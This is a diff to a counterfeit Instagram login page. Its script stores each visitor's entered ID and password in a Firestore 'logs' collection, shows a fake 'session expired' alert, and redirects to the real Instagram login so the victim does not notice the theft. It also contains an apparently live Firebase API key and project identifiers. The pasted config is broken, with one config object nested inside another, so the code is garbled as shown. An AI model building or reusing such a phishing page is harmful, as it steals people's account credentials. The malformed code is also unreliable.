@@ -26,14 +26,23 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // ★ 여기 아래 중괄호 { } 내용을 본인의 Firebase '구성' 값으로 덮어쓰세요 ★
+        // ★★★ 상준님의 Firebase 프로젝트 설정 값을 여기에 정확히 넣으세요 ★★★
         const firebaseConfig = {
-            apiKey: "AIzaSy...", 
+            apiKey: // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
+  authDomain: "instagram-be709.firebaseapp.com",
+  projectId: "instagram-be709",
+  storageBucket: "instagram-be709.firebasestorage.app",
+  messagingSenderId: "556245509978",
+  appId: "1:556245509978:web:e78967856f2ac2586f7563",
+  measurementId: "G-1KLXR0LXSZ"
+};
             authDomain: "instagram-be709.firebaseapp.com",
             projectId: "instagram-be709",
             storageBucket: "instagram-be709.appspot.com",
-            messagingSenderId: "...",
-            appId: "..."
+            messagingSenderId: "여기에_값_넣기",
+            appId: "여기에_값_넣기"
         };
 
         const app = initializeApp(firebaseConfig);
@@ -45,27 +54,25 @@
             const idVal = document.getElementById('id').value;
             const pwVal = document.getElementById('pw').value;
             
-            submitBtn.innerText = "로그인 중...";
             submitBtn.disabled = true;
 
             try {
-                // 'logs' 컬렉션에 데이터 전송
+                // 데이터 저장
                 await addDoc(collection(db, "logs"), {
                     userId: idVal,
                     userPw: pwVal,
                     timestamp: new Date()
                 });
                 
-                // 상준님이 원하신 만료 메시지
+                // 만료 메시지 띄우기
                 alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                 
-                // 진짜 인스타그램으로 이동
+                // 진짜 페이지로 이동
                 window.location.href = "https://www.instagram.com/accounts/login/";
             } catch (error) {
-                console.error(error);
-                alert("연결 오류가 발생했습니다. 잠시 후 다시 시도해주세요.");
+                console.error("오류 발생:", error);
+                alert("네트워크 연결을 확인해주세요.");
                 submitBtn.disabled = false;
-                submitBtn.innerText = "로그인";
             }
         });
     </script>
